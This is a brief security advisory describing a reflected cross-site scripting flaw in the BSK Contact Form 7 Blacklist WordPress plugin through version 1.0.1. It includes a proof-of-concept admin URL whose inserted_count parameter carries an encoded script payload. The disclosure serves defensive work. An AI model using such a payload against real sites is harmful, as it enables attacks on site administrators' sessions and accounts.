# BSK Contact Form 7 Blacklist <= 1.0.1 - Reflected Cross-Site Scripting

### Description

The plugin does not sanitise and escape the inserted\_count parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin

### Proof of Concept

https://example.com/wp-admin/admin.php?page=bsk-cf7-blacklist&listview=blacklist&view=edit&id=1&list\_save=succ&item\_action=inserted\_count&inserted\_count=1+%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
